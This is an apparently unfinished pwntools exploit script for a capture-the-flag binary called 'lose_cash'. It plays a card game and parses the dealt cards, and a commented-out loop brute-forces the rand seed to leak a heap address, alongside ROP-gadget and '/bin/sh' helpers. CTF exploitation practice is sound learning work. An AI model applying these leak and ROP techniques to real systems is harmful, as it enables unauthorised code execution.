from pwn import *
from icecream import ic
import ctypes

elf = exe = ELF("./lose_cash_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def play(hand):
    global money

    sla(b"> ", hand)
    ru("Shuffling deck...")
    rl()
    cards = []

    while True:
        x = rl().strip().decode()
        if "You won $" in x:
            break
        cards.append(x)

    winnings = x.split("You won $")[1].split("!")[0]
    winnings = int(winnings)
    
    ru("Current money: $")
    money = int(rl().strip())

    return cards, winnings

randr = ctypes.CDLL("libc.so.6")
def simulate_rand(seed):
    global randr
    randr.srand(seed)
    return [randr.rand() % 13 for _ in range(10)]


ru("Current money: $")
money = int(rl().strip())

for i in range(3):
    cards, winnings = play(b"a")
    print(f"Cards: {cards}")

    cardvals = []
    cardchars = "A234567890JQK"
    for card in cards:
        for i, c in enumerate(cardchars):
            if c in card:
                cardvals.append(i)
                break

    print(f"Card values: {cardvals}")

# for seed in range(0x550000000, 0x560000000):
#     rand = simulate_rand(seed)
#     if cardvals == rand[:len(cardvals)]:
#         heap_leak = seed >> 12
#         print(f"Found seed: {seed}")
#         print(f"Heap leak: {hex(heap_leak)}")
#         break


io.interactive()
